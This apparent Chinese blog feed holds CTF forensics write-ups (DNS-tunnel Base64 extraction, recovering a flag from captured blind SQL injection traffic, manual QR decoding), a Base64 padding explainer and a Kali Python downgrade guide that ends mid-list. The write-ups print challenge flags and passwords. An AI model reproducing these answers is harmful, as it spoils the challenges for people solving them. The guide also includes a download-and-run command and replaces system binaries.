        <content type="html"><![CDATA[<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>过滤器为<code>dns &amp;&amp; ip.dst == 8.8.8.8</code>，发现这个DNS的请求很像Base64，A是ipv4记录，AAAA是ipv6记录。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E8%BF%87%E6%BB%A4%E5%99%A81.png"></p><p>由于ipv4和ipv6发送的都是一样的流量，所以我们把过滤器改一下，我们过滤出ipv4的。</p><hr><p>过滤器为<code>dns &amp;&amp; ip.dst == 8.8.8.8 &amp;&amp; dns.qry.type == 1</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E8%BF%87%E6%BB%A4%E5%99%A82.png"></p><p>这次我们拿到的全部都是A记录的了，写个代码把Base64字符串拿出来。</p><hr><p>python代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&quot;tunnel.pcap&quot;</span>, display_filter=<span class="string">&quot;dns &amp;&amp; ip.dst == 8.8.8.8 &amp;&amp; dns.qry.type == 1&quot;</span>, tshark_path=<span class="string">&quot;D:/Program Files/Wireshark/tshark.exe&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;base64_str.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cap:</span><br><span class="line">        base64_str = <span class="built_in">str</span>(c.dns.qry_name).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        f.write(base64_str + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行后，运行目录获得<code>base64_str.txt</code>，如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/base64_1.png"></p><p>用在线网站解码第一段，<a href="https://the-x.cn/base64">点我进入在线网站</a>。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E8%A7%A3%E7%A0%81%E6%8A%A5%E9%94%99.png"></p><p>解码出错了，所以说后面还要补上 <code>=</code> 符号，这个不明白的去看一下Base64编码流程。</p><hr><p>直接上工具，就好了，或者去网站找Base64的补 <code>=</code> 符号代码，或者看我的博文，<a href="https://blog.csdn.net/qq_47875210/article/details/126617167">戳我即可</a>。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Base64-Tools.png"></p><p>已经自动补全<code>=</code>，并拿到了Base64隐写的结果，<code>password: B@%MG&quot;6FjbS8^c#r</code></p><hr><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/zip%E6%96%87%E4%BB%B6%E5%A4%B4.png"></p><p>拿到第一行补全后的Base64字符串解码，获得16进制，<code>50 4B 03 04</code>文件头，这不纯纯的ZIP格式，所以写代码拿到这个ZIP文件。</p><p>先把Base64补全<code>=</code>后的字符串保存到本地，然后Python代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取没有补全的base64</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;base64_str.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    data = data.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先补全base64的`=`，保存到本地</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;base64_str补全=后.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">        missing_padding = <span class="built_in">len</span>(line) % <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> missing_padding != <span class="number">0</span>:</span><br><span class="line">            line += <span class="string">&quot;=&quot;</span> * (<span class="number">4</span> - missing_padding)</span><br><span class="line">        f.write(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取每行Base64，然后解码保存为flag.zip</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;base64_str补全=后.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    data = data.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">        f.write(base64.b64decode(line.encode(<span class="string">&quot;utf-8&quot;</span>)))</span><br></pre></td></tr></table></figure><p>运行结果，本地出现<code>flag.zip</code>，成功拿到了。</p><hr><p>用之前的Base64隐写的pass密码解压<code>flag.zip</code>，如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/flag.png"></p><p>FLAG：<code>flag&#123;D01n&#39;t_5pY_0nmE&#125;</code></p><br><h2 id="本题要素"><a href="#本题要素" class="headerlink" title="本题要素"></a>本题要素</h2><p>1.要熟悉DNS的流量，会使用pyshark，或者其他方式解析流量，比如tshark命令。</p><p>2.熟悉Base64编码，会补全 <code>=</code> 符号</p><p>3.熟悉Base64隐写。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Base64补全原理（以及代码）</title>
      <link href="/posts/36938.html"/>
      <url>/posts/36938.html</url>
      
        <content type="html"><![CDATA[<h1 id="补全原理"><a href="#补全原理" class="headerlink" title="补全原理"></a>补全原理</h1><p>base64编码后的字符串，每4字节一组。</p><hr><p>例子：（下面的base64编码后的字符串都没有 <code>=</code> 符号）</p><table><thead><tr><th>编码后</th><th>len</th><th>补全几个 <code>=</code> 符号</th><th>补全后</th><th>解码后</th></tr></thead><tbody><tr><td>aGVsbA</td><td>6</td><td>4 - (6 % 4) &#x3D; 2</td><td>aGVsbA&#x3D;&#x3D;</td><td>hell</td></tr><tr><td>aGVsbG8</td><td>7</td><td>4 - (7 % 4) &#x3D; 1</td><td>aGVsbG8&#x3D;</td><td>hello</td></tr><tr><td>aGVsbG93</td><td>8</td><td>8 % 4 &#x3D;&#x3D; 0，所以不需要补</td><td>aGVsbG93</td><td>hellow</td></tr></tbody></table><p>代码逻辑：</p><ul><li>1.先用 <code>len % 4</code> 如果等于0，就说明不需要补<code>=</code></li><li>2.<code>len % 4</code> 不等于0，就说明需要补<code>=</code>，末尾补全 <code>4 - (len % 4)</code> 位 <code>=</code></li></ul><hr><p>Python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wf = <span class="built_in">open</span>(<span class="string">&quot;base64_str补全=后.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;base64_str.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    data = data.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    missing_padding = <span class="built_in">len</span>(line) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> missing_padding != <span class="number">0</span>:</span><br><span class="line">        line += <span class="string">&quot;=&quot;</span> * (<span class="number">4</span> - missing_padding)</span><br><span class="line">    wf.write(line + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Base系列补全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base系列补全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-高手进阶：easy_misc</title>
      <link href="/posts/59151.html"/>
      <url>/posts/59151.html</url>
      
        <content type="html"><![CDATA[<h1 id="png-crc爆破"><a href="#png-crc爆破" class="headerlink" title="png_crc爆破"></a>png_crc爆破</h1><p>首先是一个压缩包，需要密码，进行密码爆破得到密码<code>qwer</code>。</p><p>解压后，得到一张图片：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E5%8E%9F%E5%9B%BE.jpg"></p><p>打开链接，发现需要密码，盲猜png图片被改了高度。</p><p>不会解决的，参考我的<a href="https://blog.csdn.net/qq_47875210/article/details/126171502">CRC爆破png图片宽度和高度原理以及python代码</a></p><hr><p>爆破后，恢复正常图片：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/1.png"></p><hr><p>下载云盘文件 <code>file.pcap</code> 到本地打开后出现报错如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E6%8A%A5%E9%94%99.jpg"></p><p>为了解决这种情况，先点OK，按快捷键 <code>Ctrl+shift+s</code>，选中第二个，然后点保存为 <code>file.pcapng</code>，做这一步为了方便，我们使用pyshark这个库解析时候，不会出现刚才打开 <code>file.pcap</code> 的报错信息。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E5%8F%A6%E5%AD%98.jpg"></p><br><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>分析了一下数据包后，很明显的是延迟注入。</p><p>过滤器为<code>http.request.uri.query.parameter contains &quot;tologin&quot;</code>，如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E5%88%86%E6%9E%90.jpg"></p><br><p>稍微敲了敲代码，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line"><span class="comment"># tshark_path这个路径要根据你自己情况更改，由于我不是默认安装目录所以我需要填写。</span></span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&quot;file.pcapng&quot;</span>, tshark_path=<span class="string">&quot;D:/Program Files/Wireshark/tshark.exe&quot;</span>, display_filter=<span class="string">&#x27;http.request &amp;&amp; http.request.uri.query.parameter contains &quot;tologin&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="number">39</span> * <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cap:</span><br><span class="line">    <span class="comment"># 由于我不太会解析xml，官方文档也没找到，所以使用最简单str() + re正则表达式</span></span><br><span class="line">    result = <span class="built_in">str</span>(c[<span class="string">&quot;urlencoded-form&quot;</span>])[:<span class="number">300</span>]</span><br><span class="line">    pos = re.findall(<span class="string">&quot;select flag from flag limit 0,1\),(.*?),&quot;</span>, result)[<span class="number">0</span>]</span><br><span class="line">    number = re.findall(<span class="string">&quot;select flag from flag limit.*?\)\)=(.*?),&quot;</span>, result)[<span class="number">0</span>]</span><br><span class="line">    flag[<span class="built_in">int</span>(pos) - <span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">int</span>(number))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><hr><p>运行结果如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/python%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.jpg"></p><p><strong>flag{cd2c3e2fea463ded9af800d7155be7aq}</strong></p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<em><strong>拜拜！</strong></em></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux 2022.2 python3.10 回退 python3.8</title>
      <link href="/posts/15475.html"/>
      <url>/posts/15475.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-更改源更新apt"><a href="#0-更改源更新apt" class="headerlink" title="0.更改源更新apt"></a>0.更改源更新apt</h1><p><strong>更改源：</strong><a href="https://developer.aliyun.com/mirror/kali">戳我然后更改</a></p><p><strong>更新软件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade</span><br></pre></td></tr></table></figure><p>上面的命令需要一些时间的，这个根据个人网速。</p><br><h1 id="1-安装编译依赖"><a href="#1-安装编译依赖" class="headerlink" title="1.安装编译依赖"></a>1.安装编译依赖</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y build-dep python3 &amp;&amp; sudo apt-get install -y pkg-config</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y build-essential gdb lcov pkg-config \</span><br><span class="line">      libbz2-dev libffi-dev libgdbm-dev libgdbm-compat-dev liblzma-dev \</span><br><span class="line">      libncurses5-dev libreadline6-dev libsqlite3-dev libssl-dev \</span><br><span class="line">      lzma lzma-dev tk-dev uuid-dev zlib1g-dev</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://devguide.python.org/getting-started/setup-building/#linux">https://devguide.python.org/getting-started/setup-building/#linux</a></p><br><h1 id="2-下载解压源码"><a href="#2-下载解压源码" class="headerlink" title="2.下载解压源码"></a>2.下载解压源码</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local &amp;&amp; mkdir Python3 &amp;&amp; cd Python3 &amp;&amp; wget https://www.python.org/ftp/python/3.8.8/Python-3.8.8.tgz &amp;&amp;  tar -xzf Python-3.8.8.tgz &amp;&amp; cd Python-3.8.8/</span><br></pre></td></tr></table></figure><br><h1 id="3-编译及安装"><a href="#3-编译及安装" class="headerlink" title="3.编译及安装"></a>3.编译及安装</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure -with-ssl prefix=/usr/local/Python3/ &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><br><h1 id="4-软连接pip3-和python3-8"><a href="#4-软连接pip3-和python3-8" class="headerlink" title="4.软连接pip3 和python3.8"></a>4.软连接pip3 和python3.8</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /usr/bin/python3 /usr/bin/python3.bak &amp;&amp; ln -s /usr/local/Python3/bin/python3.8 /usr/bin/python3</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /usr/bin/pip3 /usr/bin/pip3.bak &amp;&amp; ln -s /usr/local/Python3/bin/pip3 /usr/bin/pip3</span><br></pre></td></tr></table></figure><br><h1 id="5-添加环境变量"><a href="#5-添加环境变量" class="headerlink" title="5.添加环境变量"></a>5.添加环境变量</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure><p>然后在文件末尾添加</p><p><code>export PATH=/usr/local/Python3/bin:$PATH</code></p><p>按ESC，输入:wq回车退出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><br><h1 id="6-生成pip和库"><a href="#6-生成pip和库" class="headerlink" title="6.生成pip和库"></a>6.生成pip和库</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --upgrade pip &amp;&amp; pip3 install --upgrade setuptools</span><br></pre></td></tr></table></figure><br><h1 id="报错解决："><a href="#报错解决：" class="headerlink" title="报错解决："></a>报错解决：</h1><p><strong>常见报错1：</strong></p><p>当使用pip的时候，就会出现：</p><p><code>subprocess.CalledProcessError: Command &#39;(&#39;lsb_release&#39;, &#39;-a&#39;)&#39; returned non-zero exit status 1.</code></p><br><p>注意：是<code>/usr/local/Python3/lib/python3.8</code>路径下缺少lsb_release.py文件（具体报错路径查看自己电脑报错路径），解决方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find / -name &#x27;lsb_release.py</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这是我的路径，情况不同，自己注意，如果您一直按照我的步骤来做的话，那就可以复制下面的命令即可！</span></span><br><span class="line">cp /usr/lib/python3/dist-packages/lsb_release.py /usr/local/Python3/lib/python3.8</span><br></pre></td></tr></table></figure><br><p><strong>常见报错2：</strong></p><p>当使用终端时候：</p><p><code>ModuleNotFoundError: No module named &#39;apt_pkg&#39;</code></p><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install --reinstall python3-apt</span><br><span class="line">cd /usr/lib/python3/dist-packages/ &amp;&amp; sudo cp apt_pkg.cpython-310-x86_64-linux-gnu.so apt_pkg.cpython-38-x86_64-linux-gnu.so</span><br></pre></td></tr></table></figure><br><h1 id="番外篇："><a href="#番外篇：" class="headerlink" title="番外篇："></a>番外篇：</h1><p>kali python2没有pip的问题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py &amp;&amp; sudo python2 get-pip.py &amp;&amp; rm get-pip.py</span><br></pre></td></tr></table></figure><p>升级pip和库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install --upgrade pip &amp;&amp; pip2 install --upgrade setuptools</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-36D杯: ez-qrcode</title>
      <link href="/posts/15890.html"/>
      <url>/posts/15890.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-第一眼"><a href="#1-第一眼" class="headerlink" title="1.第一眼"></a>1.第一眼</h2><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/gif%E5%8E%9F%E5%9B%BE.gif" style="zoom:50%;" align="left"/><p>用ps稍微处理一下：</p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/gif1.png" style="zoom:50%;" align="left"/><p>此二维码的大小为 29x29，版本<em>V</em>的大小为<em>N × N</em>，<em>N &#x3D; 17 + 4V</em>，所以这是版本 3。</p><h2 id="2-格式信息"><a href="#2-格式信息" class="headerlink" title="2.格式信息"></a>2.格式信息</h2><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E6%A0%BC%E5%BC%8F%E4%BF%A1%E6%81%AF-16604439673175.jpg" align="left"/><p>图中两处红色方框，表示二维码的格式信息，前面7位，后面8位。</p><p>后面8位的格式信息为：<code>11100111</code>，前7位我们不清楚，所以我们的信息字符串为：<code>???????11100111</code></p><p><strong>所有格式信息字符串的列表</strong></p><table><thead><tr><th>ECC 级别</th><th>掩码图案</th><th>类型信息比特</th></tr></thead><tbody><tr><td>L</td><td>0</td><td>111011111000100</td></tr><tr><td>L</td><td>1</td><td>111001011110011</td></tr><tr><td>L</td><td>2</td><td>111110110101010</td></tr><tr><td>L</td><td>3</td><td>111100010011101</td></tr><tr><td>L</td><td>4</td><td>110011000101111</td></tr><tr><td>L</td><td>5</td><td>110001100011000</td></tr><tr><td>L</td><td>6</td><td>110110001000001</td></tr><tr><td>L</td><td>7</td><td>110100101110110</td></tr><tr><td>M</td><td>0</td><td>101010000010010</td></tr><tr><td>M</td><td>1</td><td>101000100100101</td></tr><tr><td>M</td><td>2</td><td>101111001111100</td></tr><tr><td>M</td><td>3</td><td>101101101001011</td></tr><tr><td>M</td><td>4</td><td>100010111111001</td></tr><tr><td>M</td><td>5</td><td>100000011001110</td></tr><tr><td>M</td><td>6</td><td>100111110010111</td></tr><tr><td>M</td><td>7</td><td>100101010100000</td></tr><tr><td>Q</td><td>0</td><td>011010101011111</td></tr><tr><td>Q</td><td>1</td><td>011000001101000</td></tr><tr><td>Q</td><td>2</td><td>011111100110001</td></tr><tr><td>Q</td><td>3</td><td>011101000000110</td></tr><tr><td>Q</td><td>4</td><td>010010010110100</td></tr><tr><td>Q</td><td>5</td><td>010000110000011</td></tr><tr><td>Q</td><td>6</td><td>010111011011010</td></tr><tr><td>Q</td><td>7</td><td>010101111101101</td></tr><tr><td>H</td><td>0</td><td>001011010001001</td></tr><tr><td>H</td><td>1</td><td>001001110111110</td></tr><tr><td>H</td><td>2</td><td>001110011100111</td></tr><tr><td>H</td><td>3</td><td>001100111010000</td></tr><tr><td>H</td><td>4</td><td>000011101100010</td></tr><tr><td>H</td><td>5</td><td>000001001010101</td></tr><tr><td>H</td><td>6</td><td>000110100001100</td></tr><tr><td>H</td><td>7</td><td>000100000111011</td></tr></tbody></table><p>根据二维的信息字符串<code>???????11100111</code>再结合<a href="http://www.thonky.com/qr-code-tutorial/format-version-tables/#list-of-all-format-information-strings">所有格式信息字符串的列表</a>或者上图表格。</p><p>很容易得到这个二维码的ECC级别为H和掩码模式为2。</p><h2 id="3-去掉掩码"><a href="#3-去掉掩码" class="headerlink" title="3.去掉掩码"></a>3.去掉掩码</h2><table><thead><tr><th>掩码号</th><th>如果下面的公式对于给定的行&#x2F;列坐标为真，则切换该坐标处的位</th></tr></thead><tbody><tr><td>0</td><td>(行 + 列) mod 2 &#x3D;&#x3D; 0</td></tr><tr><td>1</td><td>(行) mod 2 &#x3D;&#x3D; 0</td></tr><tr><td>2</td><td>(列) mod 3 &#x3D;&#x3D; 0</td></tr><tr><td>3</td><td>(行 + 列) mod 3 &#x3D;&#x3D; 0</td></tr><tr><td>4</td><td>(floor(行 &#x2F; 2) + floor(列 &#x2F; 3)) mod 2 &#x3D;&#x3D; 0</td></tr><tr><td>5</td><td>((行 * 列) mod 2) + ((行 * 列) mod 3) &#x3D;&#x3D; 0</td></tr><tr><td>6</td><td>( ((行 * 列) mod 2) + ((行 * 列) mod 3) ) mod 2 &#x3D;&#x3D; 0</td></tr><tr><td>7</td><td>( ((行 + 列) mod 2) + ((行 * 列) mod 3) ) mod 2 &#x3D;&#x3D; 0</td></tr></tbody></table><p>根据<a href="http://www.thonky.com/qr-code-tutorial/mask-patterns/">QR Mask Patterns Explained</a>，也就是上面的表格，2 号掩码有公式<code>(列) mod 3 == 0</code>。注意列号是从0开始的，所以我们要切换坐标为0,3,6,9, … ,27的列的位。</p><p>二维码也有固定的图案，所以我们只需要切换数据部分的位即可。查看数据区和位顺序。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/776px-QR_Ver3_Codeword_Ordering.svg.png"><br>（通过<a href="http://commons.wikimedia.org/wiki/File:QR_Ver3_Codeword_Ordering.svg">wikipedia.org</a>)</p><p>所以，原始的 D1-D26 是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">D1 = 00010100</span><br><span class="line">D14 = 10100010</span><br><span class="line">D2 = 00110011</span><br><span class="line">D15 = 00010001</span><br><span class="line">D3 = 00110011</span><br><span class="line">D16 = 01110110</span><br><span class="line">D4 = 11000110</span><br><span class="line">D17 = 01010111</span><br><span class="line">D5 = 00010110</span><br><span class="line">D18 = 01000100</span><br><span class="line">D6 = 11011101</span><br><span class="line">D19 = 00101100</span><br><span class="line">D7 = 00011111</span><br><span class="line">D20 = 01011110</span><br><span class="line">D8 = 00011100</span><br><span class="line">D21 = 00000010</span><br><span class="line">D9 = 00100001</span><br><span class="line">D22 = 01100110</span><br><span class="line">D10 = 00110110</span><br><span class="line">D23 = 01010111</span><br><span class="line">D11 = 00010110</span><br><span class="line">D24 = 11010000</span><br><span class="line">D12 = 11100110</span><br><span class="line">D25 = 11101101</span><br><span class="line">D13 = 10110011</span><br><span class="line">D26 = 01000100</span><br></pre></td></tr></table></figure><p>去掉掩码后，(列) mod 3 &#x3D;&#x3D; 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">D1 = 01000001</span><br><span class="line">D14 = 11110111</span><br><span class="line">D2 = 01100110</span><br><span class="line">D15 = 01000100</span><br><span class="line">D3 = 01100110</span><br><span class="line">D16 = 01110110</span><br><span class="line">D4 = 11000110</span><br><span class="line">D17 = 01010111</span><br><span class="line">D5 = 00010110</span><br><span class="line">D18 = 01000100</span><br><span class="line">D6 = 01110111</span><br><span class="line">D19 = 10000110</span><br><span class="line">D7 = 10110101</span><br><span class="line">D20 = 11110111</span><br><span class="line">D8 = 01000110</span><br><span class="line">D21 = 01010111</span><br><span class="line">D9 = 01110100</span><br><span class="line">D22 = 00110110</span><br><span class="line">D10 = 00110110</span><br><span class="line">D23 = 01010111</span><br><span class="line">D11 = 00010110</span><br><span class="line">D24 = 11010000</span><br><span class="line">D12 = 11100110</span><br><span class="line">D25 = 11101100</span><br><span class="line">D13 = 11100110</span><br><span class="line">D26 = 00010001</span><br></pre></td></tr></table></figure><h2 id="4-数据解码"><a href="#4-数据解码" class="headerlink" title="4.数据解码"></a>4.数据解码</h2><p>解码有<a href="http://www.thonky.com/qr-code-tutorial/data-encoding/#step-3-add-the-mode-indicator">模式指示符</a>：</p><ul><li><code>0001</code>：数字模式（每 3 位 10 位）</li><li><code>0010</code>：字母数字模式（每 2 个字符 11 位）</li><li><code>0100</code>：字节模式（每个字符 8 位）</li><li><code>1000</code>：汉字模式（每个字符 13 位）</li><li><code>0111</code>: ECI 模式</li></ul><p><a href="http://www.thonky.com/qr-code-tutorial/data-encoding/#step-4-add-the-character-count-indicator">字符计数指示符</a>跟在模式指示符之后。</p><ul><li>版本 1-9<ul><li>数字模式：10 位</li><li>字母数字模式：9位</li><li>字节模式：8位</li><li>汉字模式：8位</li></ul></li><li>版本 10–26<ul><li>数字模式：12位</li><li>字母数字模式：11 位</li><li>字节模式：16位</li><li>汉字模式：10位</li></ul></li><li>版本 27–40<ul><li>数字模式：14位</li><li>字母数字模式：13 位</li><li>字节模式：16位</li><li>汉字模式：12位</li></ul></li></ul><p>查看每种模式的编码过程：</p><ul><li><a href="http://www.thonky.com/qr-code-tutorial/numeric-mode-encoding/">数字模式编码</a></li><li><a 